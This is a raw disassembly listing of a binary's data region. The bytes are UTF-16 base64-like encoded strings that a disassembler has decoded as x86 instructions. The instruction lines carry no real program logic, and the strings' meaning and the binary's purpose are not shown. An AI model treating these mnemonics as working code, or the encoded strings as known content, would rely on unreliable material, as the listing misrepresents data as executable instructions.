  409eec:	30 00                	xor    %al,(%eax)
  409eee:	6c                   	insb   (%dx),%es:(%edi)
  409eef:	00 45 00             	add    %al,0x0(%ebp)
  409ef2:	4e                   	dec    %esi
  409ef3:	00 47 00             	add    %al,0x0(%edi)
  409ef6:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  409efa:	62 00                	bound  %eax,(%eax)
  409efc:	30 00                	xor    %al,(%eax)
  409efe:	73 00                	jae    0x409f00
  409f00:	35 00 62 00 47       	xor    $0x47006200,%eax
  409f05:	00 78 00             	add    %bh,0x0(%eax)
  409f08:	46                   	inc    %esi
  409f09:	00 57 00             	add    %dl,0x0(%edi)
  409f0c:	47                   	inc    %edi
  409f0d:	00 52 00             	add    %dl,0x0(%edx)
  409f10:	4f                   	dec    %edi
  409f11:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  409f15:	00 70 00             	add    %dh,0x0(%eax)
  409f18:	6b 00 61             	imul   $0x61,(%eax),%eax
  409f1b:	00 46 00             	add    %al,0x0(%esi)
  409f1e:	68 00 6f 00 64       	push   $0x64006f00
  409f23:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  409f27:	00 7a 00             	add    %bh,0x0(%edx)
  409f2a:	62 00                	bound  %eax,(%eax)
  409f2c:	55                   	push   %ebp
  409f2d:	00 63 00             	add    %ah,0x0(%ebx)
  409f30:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409f35:	48                   	dec    %eax
  409f36:	00 49 00             	add    %cl,0x0(%ecx)
  409f39:	46                   	inc    %esi
  409f3a:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  409f3e:	00 53 00             	add    %dl,0x0(%ebx)
  409f41:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  409f45:	68 00 4b 00 63       	push   $0x63004b00
  409f4a:	00 2f                	add    %ch,(%edi)
  409f4c:	00 72 00             	add    %dh,0x0(%edx)
  409f4f:	44                   	inc    %esp
  409f50:	00 33                	add    %dh,(%ebx)
  409f52:	00 76 00             	add    %dh,0x0(%esi)
  409f55:	2f                   	das
  409f56:	00 31                	add    %dh,(%ecx)
  409f58:	00 4a 00             	add    %cl,0x0(%edx)
  409f5b:	45                   	inc    %ebp
  409f5c:	00 6f 00             	add    %ch,0x0(%edi)
  409f5f:	53                   	push   %ebx
  409f60:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  409f64:	00 42 00             	add    %al,0x0(%edx)
  409f67:	45                   	inc    %ebp
  409f68:	00 67 00             	add    %ah,0x0(%edi)
  409f6b:	48                   	dec    %eax
  409f6c:	00 53 00             	add    %dl,0x0(%ebx)
  409f6f:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  409f73:	68 00 5a 00 38       	push   $0x38005a00
  409f78:	00 76 00             	add    %dh,0x0(%esi)
  409f7b:	68 00 37 00 6c       	push   $0x6c003700
  409f80:	00 32                	add    %dh,(%edx)
  409f82:	00 39                	add    %bh,(%ecx)
  409f84:	00 7a 00             	add    %bh,0x0(%edx)
  409f87:	59                   	pop    %ecx
  409f88:	00 72 00             	add    %dh,0x0(%edx)
  409f8b:	73 00                	jae    0x409f8d
  409f8d:	35 00 58 00 44       	xor    $0x44005800,%eax
  409f92:	00 57 00             	add    %dl,0x0(%edi)
  409f95:	50                   	push   %eax
  409f96:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f99:	54                   	push   %esp
  409f9a:	00 41 00             	add    %al,0x0(%ecx)
  409f9d:	55                   	push   %ebp
  409f9e:	00 69 00             	add    %ch,0x0(%ecx)
  409fa1:	4e                   	dec    %esi
  409fa2:	00 48 00             	add    %cl,0x0(%eax)
  409fa5:	7a 00                	jp     0x409fa7
  409fa7:	4a                   	dec    %edx
  409fa8:	00 35 00 66 00 59    	add    %dh,0x59006600
  409fae:	00 41 00             	add    %al,0x0(%ecx)
  409fb1:	6a 00                	push   $0x0
  409fb3:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409fb7:	6a 00                	push   $0x0
  409fb9:	51                   	push   %ecx
  409fba:	00 59 00             	add    %bl,0x0(%ecx)
  409fbd:	66 00 31             	data16 add %dh,(%ecx)
  409fc0:	00 2f                	add    %ch,(%edi)
  409fc2:	00 6e 00             	add    %ch,0x0(%esi)
  409fc5:	6d                   	insl   (%dx),%es:(%edi)
  409fc6:	00 79 00             	add    %bh,0x0(%ecx)
  409fc9:	57                   	push   %edi
  409fca:	00 59 00             	add    %bl,0x0(%ecx)
  409fcd:	4b                   	dec    %ebx
  409fce:	00 4e 00             	add    %cl,0x0(%esi)
  409fd1:	2f                   	das
  409fd2:	00 6d 00             	add    %ch,0x0(%ebp)
  409fd5:	32 00                	xor    (%eax),%al
  409fd7:	50                   	push   %eax
  409fd8:	00 6f 00             	add    %ch,0x0(%edi)
  409fdb:	49                   	dec    %ecx
  409fdc:	00 6a 00             	add    %ch,0x0(%edx)
  409fdf:	77 00                	ja     0x409fe1
  409fe1:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409fe6:	92                   	xchg   %eax,%edx
  409fe7:	59                   	pop    %ecx
  409fe8:	47                   	inc    %edi
  409fe9:	00 5a 00             	add    %bl,0x0(%edx)
  409fec:	62 00                	bound  %eax,(%eax)
  409fee:	51                   	push   %ecx
  409fef:	00 75 00             	add    %dh,0x0(%ebp)
  409ff2:	42                   	inc    %edx
  409ff3:	00 70 00             	add    %dh,0x0(%eax)
  409ff6:	4d                   	dec    %ebp
  409ff7:	00 73 00             	add    %dh,0x0(%ebx)
  409ffa:	45                   	inc    %ebp
  409ffb:	00 7a 00             	add    %bh,0x0(%edx)
  409ffe:	34 00                	xor    $0x0,%al
  40a000:	61                   	popa
  40a001:	00 6a 00             	add    %ch,0x0(%edx)
  40a004:	78 00                	js     0x40a006
  40a006:	39 00                	cmp    %eax,(%eax)
  40a008:	78 00                	js     0x40a00a
  40a00a:	71 00                	jno    0x40a00c
  40a00c:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40a010:	70 00                	jo     0x40a012
  40a012:	7a 00                	jp     0x40a014
  40a014:	54                   	push   %esp
  40a015:	00 56 00             	add    %dl,0x0(%esi)
  40a018:	48                   	dec    %eax
  40a019:	00 69 00             	add    %ch,0x0(%ecx)
  40a01c:	5a                   	pop    %edx
  40a01d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a020:	61                   	popa
  40a021:	00 52 00             	add    %dl,0x0(%edx)
  40a024:	39 00                	cmp    %eax,(%eax)
  40a026:	59                   	pop    %ecx
  40a027:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a02a:	2f                   	das
  40a02b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a02e:	64 00 2f             	add    %ch,%fs:(%edi)
  40a031:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a034:	55                   	push   %ebp
  40a035:	00 4e 00             	add    %cl,0x0(%esi)
  40a038:	32 00                	xor    (%eax),%al
  40a03a:	49                   	dec    %ecx
  40a03b:	00 30                	add    %dh,(%eax)
  40a03d:	00 67 00             	add    %ah,0x0(%edi)
  40a040:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a044:	45                   	inc    %ebp
  40a045:	00 71 00             	add    %dh,0x0(%ecx)
  40a048:	6a 00                	push   $0x0
  40a04a:	39 00                	cmp    %eax,(%eax)
  40a04c:	30 00                	xor    %al,(%eax)
  40a04e:	46                   	inc    %esi
  40a04f:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40a053:	00 41 00             	add    %al,0x0(%ecx)
  40a056:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40a05a:	77 00                	ja     0x40a05c
  40a05c:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40a060:	2f                   	das
  40a061:	00 6b 00             	add    %ch,0x0(%ebx)
  40a064:	56                   	push   %esi
  40a065:	00 48 00             	add    %cl,0x0(%eax)
  40a068:	76 00                	jbe    0x40a06a
  40a06a:	45                   	inc    %ebp
  40a06b:	00 78 00             	add    %bh,0x0(%eax)
  40a06e:	35 00 58 00 62       	xor    $0x62005800,%eax
  40a073:	00 75 00             	add    %dh,0x0(%ebp)
  40a076:	6f                   	outsl  %ds:(%esi),(%dx)
  40a077:	00 71 00             	add    %dh,0x0(%ecx)
  40a07a:	56                   	push   %esi
  40a07b:	00 77 00             	add    %dh,0x0(%edi)
  40a07e:	63 00                	arpl   %eax,(%eax)
  40a080:	55                   	push   %ebp
  40a081:	00 35 00 59 00 66    	add    %dh,0x66005900
  40a087:	00 50 00             	add    %dl,0x0(%eax)
  40a08a:	79 00                	jns    0x40a08c
  40a08c:	41                   	inc    %ecx
  40a08d:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40a091:	00 6d 00             	add    %ch,0x0(%ebp)
  40a094:	47                   	inc    %edi
  40a095:	00 36                	add    %dh,(%esi)
  40a097:	00 6e 00             	add    %ch,0x0(%esi)
  40a09a:	4b                   	dec    %ebx
  40a09b:	00 78 00             	add    %bh,0x0(%eax)
  40a09e:	30 00                	xor    %al,(%eax)
  40a0a0:	70 00                	jo     0x40a0a2
  40a0a2:	47                   	inc    %edi
  40a0a3:	00 4f 00             	add    %cl,0x0(%edi)
  40a0a6:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40a0aa:	39 00                	cmp    %eax,(%eax)
  40a0ac:	31 00                	xor    %eax,(%eax)
  40a0ae:	54                   	push   %esp
  40a0af:	00 75 00             	add    %dh,0x0(%ebp)
  40a0b2:	49                   	dec    %ecx
  40a0b3:	00 6a 00             	add    %ch,0x0(%edx)
  40a0b6:	77 00                	ja     0x40a0b8
  40a0b8:	4d                   	dec    %ebp
  40a0b9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0bc:	52                   	push   %edx
  40a0bd:	00 35 00 6f 00 76    	add    %dh,0x76006f00
  40a0c3:	00 46 00             	add    %al,0x0(%esi)
  40a0c6:	72 00                	jb     0x40a0c8
  40a0c8:	63 00                	arpl   %eax,(%eax)
  40a0ca:	75 00                	jne    0x40a0cc
  40a0cc:	78 00                	js     0x40a0ce
  40a0ce:	4c                   	dec    %esp
  40a0cf:	00 42 00             	add    %al,0x0(%edx)
  40a0d2:	55                   	push   %ebp
  40a0d3:	00 6f 00             	add    %ch,0x0(%edi)
  40a0d6:	2f                   	das
  40a0d7:	00 43 00             	add    %al,0x0(%ebx)
  40a0da:	33 00                	xor    (%eax),%eax
  40a0dc:	59                   	pop    %ecx
  40a0dd:	00 73 00             	add    %dh,0x0(%ebx)
  40a0e0:	55                   	push   %ebp
  40a0e1:	00 42 00             	add    %al,0x0(%edx)
  40a0e4:	34 00                	xor    $0x0,%al
  40a0e6:	35 00 72 00 47       	xor    $0x47007200,%eax
  40a0eb:	00 66 00             	add    %ah,0x0(%esi)
  40a0ee:	4f                   	dec    %edi
  40a0ef:	00 77 00             	add    %dh,0x0(%edi)
  40a0f2:	32 00                	xor    (%eax),%al
  40a0f4:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40a0f8:	33 00                	xor    (%eax),%eax
  40a0fa:	51                   	push   %ecx
  40a0fb:	00 6a 00             	add    %ch,0x0(%edx)
  40a0fe:	6d                   	insl   (%dx),%es:(%edi)
  40a0ff:	00 66 00             	add    %ah,0x0(%esi)
  40a102:	62 00                	bound  %eax,(%eax)
  40a104:	77 00                	ja     0x40a106
  40a106:	6f                   	outsl  %ds:(%esi),(%dx)
  40a107:	00 4b 00             	add    %cl,0x0(%ebx)
  40a10a:	70 00                	jo     0x40a10c
  40a10c:	58                   	pop    %eax
  40a10d:	00 57 00             	add    %dl,0x0(%edi)
  40a110:	59                   	pop    %ecx
  40a111:	00 48 00             	add    %cl,0x0(%eax)
  40a114:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40a118:	53                   	push   %ebx
  40a119:	00 35 00 64 00 66    	add    %dh,0x66006400
  40a11f:	00 35 00 46 00 52    	add    %dh,0x52004600
  40a125:	00 32                	add    %dh,(%edx)
  40a127:	00 39                	add    %bh,(%ecx)
  40a129:	00 71 00             	add    %dh,0x0(%ecx)
  40a12c:	4b                   	dec    %ebx
  40a12d:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40a131:	00 65 00             	add    %ah,0x0(%ebp)
  40a134:	39 00                	cmp    %eax,(%eax)
  40a136:	4c                   	dec    %esp
  40a137:	00 50 00             	add    %dl,0x0(%eax)
  40a13a:	72 00                	jb     0x40a13c
  40a13c:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40a140:	4a                   	dec    %edx
  40a141:	00 6d 00             	add    %ch,0x0(%ebp)
  40a144:	76 00                	jbe    0x40a146
  40a146:	6d                   	insl   (%dx),%es:(%edi)
  40a147:	00 6a 00             	add    %ch,0x0(%edx)
  40a14a:	48                   	dec    %eax
  40a14b:	00 50 00             	add    %dl,0x0(%eax)
  40a14e:	62 00                	bound  %eax,(%eax)
  40a150:	35 00 77 00 78       	xor    $0x78007700,%eax
  40a155:	00 66 00             	add    %ah,0x0(%esi)
  40a158:	5a                   	pop    %edx
  40a159:	00 55 00             	add    %dl,0x0(%ebp)
  40a15c:	79 00                	jns    0x40a15e
  40a15e:	55                   	push   %ebp
  40a15f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a162:	75 00                	jne    0x40a164
  40a164:	4d                   	dec    %ebp
  40a165:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a169:	00 49 00             	add    %cl,0x0(%ecx)
  40a16c:	32 00                	xor    (%eax),%al
  40a16e:	76 00                	jbe    0x40a170
  40a170:	71 00                	jno    0x40a172
  40a172:	44                   	inc    %esp
  40a173:	00 6e 00             	add    %ch,0x0(%esi)
  40a176:	6f                   	outsl  %ds:(%esi),(%dx)
  40a177:	00 48 00             	add    %cl,0x0(%eax)
  40a17a:	37                   	aaa
  40a17b:	00 63 00             	add    %ah,0x0(%ebx)
  40a17e:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40a182:	58                   	pop    %eax
  40a183:	00 4e 00             	add    %cl,0x0(%esi)
  40a186:	48                   	dec    %eax
  40a187:	00 67 00             	add    %ah,0x0(%edi)
  40a18a:	6d                   	insl   (%dx),%es:(%edi)
  40a18b:	00 75 00             	add    %dh,0x0(%ebp)
  40a18e:	63 00                	arpl   %eax,(%eax)
  40a190:	72 00                	jb     0x40a192
  40a192:	58                   	pop    %eax
  40a193:	00 67 00             	add    %ah,0x0(%edi)
  40a196:	37                   	aaa
  40a197:	00 32                	add    %dh,(%edx)
  40a199:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40a19d:	00 65 00             	add    %ah,0x0(%ebp)
  40a1a0:	4e                   	dec    %esi
  40a1a1:	00 61 00             	add    %ah,0x0(%ecx)
  40a1a4:	39 00                	cmp    %eax,(%eax)
  40a1a6:	2f                   	das
  40a1a7:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40a1ab:	00 49 00             	add    %cl,0x0(%ecx)
  40a1ae:	6a 00                	push   $0x0
  40a1b0:	58                   	pop    %eax
  40a1b1:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a1b5:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a1b9:	00 4a 00             	add    %cl,0x0(%edx)
  40a1bc:	66 00 46 00          	data16 add %al,0x0(%esi)
  40a1c0:	4b                   	dec    %ebx
  40a1c1:	00 55 00             	add    %dl,0x0(%ebp)
  40a1c4:	70 00                	jo     0x40a1c6
  40a1c6:	61                   	popa
  40a1c7:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40a1cb:	00 63 00             	add    %ah,0x0(%ebx)
  40a1ce:	63 00                	arpl   %eax,(%eax)
  40a1d0:	61                   	popa
  40a1d1:	00 62 00             	add    %ah,0x0(%edx)
  40a1d4:	4c                   	dec    %esp
  40a1d5:	00 47 00             	add    %al,0x0(%edi)
  40a1d8:	33 00                	xor    (%eax),%eax
  40a1da:	4c                   	dec    %esp
  40a1db:	00 49 00             	add    %cl,0x0(%ecx)
  40a1de:	32 00                	xor    (%eax),%al
  40a1e0:	43                   	inc    %ebx
  40a1e1:	00 6f 00             	add    %ch,0x0(%edi)
  40a1e4:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40a1e8:	57                   	push   %edi
  40a1e9:	00 47 00             	add    %al,0x0(%edi)
  40a1ec:	4d                   	dec    %ebp
  40a1ed:	00 71 00             	add    %dh,0x0(%ecx)
  40a1f0:	61                   	popa
  40a1f1:	00 35 00 58 00 74    	add    %dh,0x74005800
  40a1f7:	00 58 00             	add    %bl,0x0(%eax)
  40a1fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1fb:	00 71 00             	add    %dh,0x0(%ecx)
  40a1fe:	75 00                	jne    0x40a200
  40a200:	6e                   	outsb  %ds:(%esi),(%dx)
  40a201:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  40a205:	00 55 00             	add    %dl,0x0(%ebp)
  40a208:	61                   	popa
  40a209:	00 2b                	add    %ch,(%ebx)
  40a20b:	00 45 00             	add    %al,0x0(%ebp)
  40a20e:	39 00                	cmp    %eax,(%eax)
  40a210:	64 00 44 00 47       	add    %al,%fs:0x47(%eax,%eax,1)
  40a215:	00 52 00             	add    %dl,0x0(%edx)
  40a218:	73 00                	jae    0x40a21a
  40a21a:	68 00 6a 00 34       	push   $0x34006a00
  40a21f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a222:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a226:	49                   	dec    %ecx
  40a227:	00 4f 00             	add    %cl,0x0(%edi)
  40a22a:	37                   	aaa
  40a22b:	00 61 00             	add    %ah,0x0(%ecx)
  40a22e:	33 00                	xor    (%eax),%eax
  40a230:	52                   	push   %edx
  40a231:	00 39                	add    %bh,(%ecx)
  40a233:	00 62 00             	add    %ah,0x0(%edx)
  40a236:	57                   	push   %edi
  40a237:	00 6b 00             	add    %ch,0x0(%ebx)
  40a23a:	62 00                	bound  %eax,(%eax)
  40a23c:	77 00                	ja     0x40a23e
  40a23e:	66 00 31             	data16 add %dh,(%ecx)
  40a241:	00 52 00             	add    %dl,0x0(%edx)
  40a244:	6e                   	outsb  %ds:(%esi),(%dx)
  40a245:	00 58 00             	add    %bl,0x0(%eax)
  40a248:	52                   	push   %edx
  40a249:	00 39                	add    %bh,(%ecx)
  40a24b:	00 36                	add    %dh,(%esi)
  40a24d:	00 50 00             	add    %dl,0x0(%eax)
  40a250:	71 00                	jno    0x40a252
  40a252:	32 00                	xor    (%eax),%al
  40a254:	2f                   	das
  40a255:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40a259:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40a25d:	00 47 00             	add    %al,0x0(%edi)
  40a260:	46                   	inc    %esi
  40a261:	00 30                	add    %dh,(%eax)
  40a263:	00 66 00             	add    %ah,0x0(%esi)
  40a266:	53                   	push   %ebx
  40a267:	00 61 00             	add    %ah,0x0(%ecx)
  40a26a:	4d                   	dec    %ebp
  40a26b:	00 49 00             	add    %cl,0x0(%ecx)
  40a26e:	50                   	push   %eax
  40a26f:	00 56 00             	add    %dl,0x0(%esi)
  40a272:	44                   	inc    %esp
  40a273:	00 33                	add    %dh,(%ebx)
  40a275:	00 77 00             	add    %dh,0x0(%edi)
  40a278:	56                   	push   %esi
  40a279:	00 42 00             	add    %al,0x0(%edx)
  40a27c:	4f                   	dec    %edi
  40a27d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a280:	77 00                	ja     0x40a282
  40a282:	6f                   	outsl  %ds:(%esi),(%dx)
  40a283:	00 77 00             	add    %dh,0x0(%edi)
  40a286:	2f                   	das
  40a287:	00 76 00             	add    %dh,0x0(%esi)
  40a28a:	66 00 38             	data16 add %bh,(%eax)
  40a28d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a290:	78 00                	js     0x40a292
  40a292:	6c                   	insb   (%dx),%es:(%edi)
  40a293:	00 32                	add    %dh,(%edx)
  40a295:	00 71 00             	add    %dh,0x0(%ecx)
  40a298:	31 00                	xor    %eax,(%eax)
  40a29a:	79 00                	jns    0x40a29c
  40a29c:	44                   	inc    %esp
  40a29d:	00 35 00 6d 00 67    	add    %dh,0x67006d00
  40a2a3:	00 51 00             	add    %dl,0x0(%ecx)
  40a2a6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2a7:	00 46 00             	add    %al,0x0(%esi)
  40a2aa:	34 00                	xor    $0x0,%al
  40a2ac:	61                   	popa
  40a2ad:	00 4e 00             	add    %cl,0x0(%esi)
  40a2b0:	39 00                	cmp    %eax,(%eax)
  40a2b2:	39 00                	cmp    %eax,(%eax)
  40a2b4:	2b 00                	sub    (%eax),%eax
  40a2b6:	71 00                	jno    0x40a2b8
  40a2b8:	4b                   	dec    %ebx
  40a2b9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a2bc:	50                   	push   %eax
  40a2bd:	00 30                	add    %dh,(%eax)
  40a2bf:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40a2c3:	00 49 00             	add    %cl,0x0(%ecx)
  40a2c6:	73 00                	jae    0x40a2c8
  40a2c8:	58                   	pop    %eax
  40a2c9:	00 31                	add    %dh,(%ecx)
  40a2cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a2ce:	6c                   	insb   (%dx),%es:(%edi)
  40a2cf:	00 59 00             	add    %bl,0x0(%ecx)
  40a2d2:	59                   	pop    %ecx
  40a2d3:	00 37                	add    %dh,(%edi)
  40a2d5:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40a2d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2dc:	68 00 6a 00 43       	push   $0x43006a00
  40a2e1:	00 6a 00             	add    %ch,0x0(%edx)
  40a2e4:	79 00                	jns    0x40a2e6
  40a2e6:	41                   	inc    %ecx
  40a2e7:	00 35 00 7a 00 6b    	add    %dh,0x6b007a00
  40a2ed:	00 4a 00             	add    %cl,0x0(%edx)
  40a2f0:	68 00 48 00 64       	push   $0x64004800
  40a2f5:	00 72 00             	add    %dh,0x0(%edx)
  40a2f8:	78 00                	js     0x40a2fa
  40a2fa:	77 00                	ja     0x40a2fc
  40a2fc:	33 00                	xor    (%eax),%eax
  40a2fe:	49                   	dec    %ecx
  40a2ff:	00 35 00 74 00 4c    	add    %dh,0x4c007400
  40a305:	00 42 00             	add    %al,0x0(%edx)
  40a308:	63 00                	arpl   %eax,(%eax)
  40a30a:	6a 00                	push   $0x0
  40a30c:	61                   	popa
  40a30d:	00 57 00             	add    %dl,0x0(%edi)
  40a310:	6b 00 58             	imul   $0x58,(%eax),%eax
  40a313:	00 6a 00             	add    %ch,0x0(%edx)
  40a316:	46                   	inc    %esi
  40a317:	00 43 00             	add    %al,0x0(%ebx)
  40a31a:	69 00 30 00 55 00    	imul   $0x550030,(%eax),%eax
  40a320:	52                   	push   %edx
  40a321:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40a325:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40a329:	00 33                	add    %dh,(%ebx)
  40a32b:	00 48 00             	add    %cl,0x0(%eax)
  40a32e:	41                   	inc    %ecx
  40a32f:	00 35 00 66 00 62    	add    %dh,0x62006600
  40a335:	00 69 00             	add    %ch,0x0(%ecx)
  40a338:	4c                   	dec    %esp
  40a339:	00 55 00             	add    %dl,0x0(%ebp)
  40a33c:	44                   	inc    %esp
  40a33d:	00 2f                	add    %ch,(%edi)
  40a33f:	00 77 00             	add    %dh,0x0(%edi)
  40a342:	39 00                	cmp    %eax,(%eax)
  40a344:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40a348:	56                   	push   %esi
  40a349:	00 63 00             	add    %ah,0x0(%ebx)
  40a34c:	54                   	push   %esp
  40a34d:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40a351:	00 68 00             	add    %ch,0x0(%eax)
  40a354:	49                   	dec    %ecx
  40a355:	00 70 00             	add    %dh,0x0(%eax)
  40a358:	68 00 44 00 4f       	push   $0x4f004400
  40a35d:	00 78 00             	add    %bh,0x0(%eax)
  40a360:	62 00                	bound  %eax,(%eax)
  40a362:	35 00 74 00 78       	xor    $0x78007400,%eax
  40a367:	00 53 00             	add    %dl,0x0(%ebx)
  40a36a:	7a 00                	jp     0x40a36c
  40a36c:	67 00 33             	add    %dh,(%bp,%di)
  40a36f:	00 55 00             	add    %dl,0x0(%ebp)
  40a372:	2f                   	das
  40a373:	00 77 00             	add    %dh,0x0(%edi)
  40a376:	33 00                	xor    (%eax),%eax
  40a378:	36 00 36             	add    %dh,%ss:(%esi)
  40a37b:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a37f:	00 4f 00             	add    %cl,0x0(%edi)
  40a382:	39 00                	cmp    %eax,(%eax)
  40a384:	62 00                	bound  %eax,(%eax)
  40a386:	41                   	inc    %ecx
  40a387:	00 36                	add    %dh,(%esi)
  40a389:	00 45 00             	add    %al,0x0(%ebp)
  40a38c:	48                   	dec    %eax
  40a38d:	00 32                	add    %dh,(%edx)
  40a38f:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40a393:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a396:	49                   	dec    %ecx
  40a397:	00 72 00             	add    %dh,0x0(%edx)
  40a39a:	33 00                	xor    (%eax),%eax
  40a39c:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40a3a0:	41                   	inc    %ecx
  40a3a1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3a4:	4a                   	dec    %edx
  40a3a5:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40a3a9:	00 7a 00             	add    %bh,0x0(%edx)
  40a3ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3ad:	00 68 00             	add    %ch,0x0(%eax)
  40a3b0:	74 00                	je     0x40a3b2
  40a3b2:	68 00 53 00 53       	push   $0x53005300
  40a3b7:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40a3bb:	00 61 00             	add    %ah,0x0(%ecx)
  40a3be:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40a3c2:	68 00 61 00 66       	push   $0x66006100
  40a3c7:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a3cb:	00 61 00             	add    %ah,0x0(%ecx)
  40a3ce:	77 00                	ja     0x40a3d0
  40a3d0:	31 00                	xor    %eax,(%eax)
  40a3d2:	4b                   	dec    %ebx
  40a3d3:	00 51 00             	add    %dl,0x0(%ecx)
  40a3d6:	2f                   	das
  40a3d7:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40a3db:	00 59 00             	add    %bl,0x0(%ecx)
  40a3de:	52                   	push   %edx
  40a3df:	00 73 00             	add    %dh,0x0(%ebx)
  40a3e2:	77 00                	ja     0x40a3e4
  40a3e4:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a3e8:	43                   	inc    %ebx
  40a3e9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3ec:	2b 00                	sub    (%eax),%eax
  40a3ee:	39 00                	cmp    %eax,(%eax)
  40a3f0:	48                   	dec    %eax
  40a3f1:	00 6a 00             	add    %ch,0x0(%edx)
  40a3f4:	2f                   	das
  40a3f5:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40a3f9:	00 4e 00             	add    %cl,0x0(%esi)
  40a3fc:	38 00                	cmp    %al,(%eax)
  40a3fe:	37                   	aaa
  40a3ff:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40a403:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a406:	5a                   	pop    %edx
  40a407:	00 66 00             	add    %ah,0x0(%esi)
  40a40a:	2f                   	das
  40a40b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a40e:	73 00                	jae    0x40a410
  40a410:	37                   	aaa
  40a411:	00 6a 00             	add    %ch,0x0(%edx)
  40a414:	51                   	push   %ecx
  40a415:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40a419:	00 59 00             	add    %bl,0x0(%ecx)
  40a41c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a41d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a420:	52                   	push   %edx
  40a421:	00 30                	add    %dh,(%eax)
  40a423:	00 76 00             	add    %dh,0x0(%esi)
  40a426:	73 00                	jae    0x40a428
  40a428:	78 00                	js     0x40a42a
  40a42a:	43                   	inc    %ebx
  40a42b:	00 30                	add    %dh,(%eax)
  40a42d:	00 58 00             	add    %bl,0x0(%eax)
  40a430:	2b 00                	sub    (%eax),%eax
  40a432:	47                   	inc    %edi
  40a433:	00 42 00             	add    %al,0x0(%edx)
  40a436:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a43a:	72 00                	jb     0x40a43c
  40a43c:	50                   	push   %eax
  40a43d:	00 69 00             	add    %ch,0x0(%ecx)
  40a440:	4d                   	dec    %ebp
  40a441:	00 2f                	add    %ch,(%edi)
  40a443:	00 35 00 46 00 70    	add    %dh,0x70004600
  40a449:	00 6a 00             	add    %ch,0x0(%edx)
  40a44c:	70 00                	jo     0x40a44e
  40a44e:	37                   	aaa
  40a44f:	00 63 00             	add    %ah,0x0(%ebx)
  40a452:	5a                   	pop    %edx
  40a453:	00 6b 00             	add    %ch,0x0(%ebx)
  40a456:	6c                   	insb   (%dx),%es:(%edi)
  40a457:	00 59 00             	add    %bl,0x0(%ecx)
  40a45a:	34 00                	xor    $0x0,%al
  40a45c:	69 00 74 00 73 00    	imul   $0x730074,(%eax),%eax
  40a462:	38 00                	cmp    %al,(%eax)
  40a464:	58                   	pop    %eax
  40a465:	00 30                	add    %dh,(%eax)
